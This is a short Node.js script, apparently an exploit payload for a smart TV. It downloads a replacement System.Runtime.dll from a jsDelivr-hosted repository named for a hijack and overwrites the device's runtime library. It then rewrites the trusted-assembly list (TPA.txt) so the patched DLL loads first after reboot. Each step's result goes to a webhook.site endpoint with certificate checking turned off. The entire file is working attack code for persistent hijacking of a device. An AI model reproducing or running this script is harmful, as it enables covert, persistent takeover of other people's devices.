var fs = require('fs');
var https = require('https');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
var patched = '/opt/usr/home/owner/share/dotnet/System.Runtime.dll';
var tpa = '/opt/usr/home/owner/share/dotnet/TPA.txt';
https.get('https://cdn.jsdelivr.net/gh/cerad95/tb-pwn-9c4f@hijack1/System.Runtime.dll', function (res) {
    var chunks = [];
    res.on('data', function (d) { chunks.push(d); });
    res.on('end', function () {
        var b = Buffer.concat(chunks);
        try {
            fs.writeFileSync(patched, b);
        } catch (e) {
            send('persist', 'write ERR ' + e);
            return;
        }
        var orig;
        try {
            orig = fs.readFileSync(tpa, 'utf8');
        } catch (e) {
            send('persist', 'tpa read ERR ' + e);
            return;
        }
        try { fs.writeFileSync(tpa + '.bak', orig); } catch (e) {}
        var list = orig.replace(/^\[START\]/, '').replace(/\[END\]\s*$/, '');
        var parts = list.split(':').filter(function (p) {
            return p && !/System\.Runtime(\.ni)?\.dll$/.test(p);
        });
        var neu = '[START]' + patched + ':' + parts.join(':') + ':[END]';
        try {
            fs.writeFileSync(tpa, neu);
        } catch (e) {
            send('persist', 'tpa write ERR ' + e);
            return;
        }
        send('persist', 'TPA persistent; patched System.Runtime at front; reboot the TV');
    });
}).on('error', function (e) {
    send('persist', 'http ERR ' + e);
});
